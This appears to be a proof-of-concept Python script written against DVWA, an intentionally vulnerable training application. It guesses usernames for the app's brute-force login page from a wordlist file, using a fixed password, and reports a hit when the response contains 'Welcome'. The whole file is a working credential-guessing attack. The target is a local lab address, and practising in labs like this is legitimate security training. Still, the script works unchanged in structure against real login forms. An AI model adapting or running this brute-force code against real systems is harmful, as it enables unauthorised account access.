# -*- coding: utf-8 -*-
"""
@Project  :dvwa-POC
@File     :dvwa-Brute-Force.py
@Date     :2022/5/10 10:34
@Author   :7-R2X

"""
import requests

cookies = {
    'PHPSESSID': 'd3rl40rfpm0qq7r12basipn3v1',
    'security': 'low',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'keep-alive',
    'DNT': '1',
    'Referer': 'http://192.168.163.131:8080/vulnerabilities/brute/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'sec-gpc': '1',
}

with open('./dict/username.txt', 'r', encoding='utf-8') as r:
    for i in r.readlines():
        user_name = i.replace('\n', '')
        params = {
            'username': user_name,
            'password': 'password',
            'Login': 'Login',
        }
        try:
            response = requests.get('http://192.168.163.131:8080/vulnerabilities/brute/', params=params, cookies=cookies,
                                    headers=headers, verify=False)
            # 判断的关键词: Welcome to the password protected area admin
            if int(response.status_code) == 200 and 'Welcome' in response.text:
                print('爆破成功: {}'.format(user_name))
        except Exception as error:
            print(error)
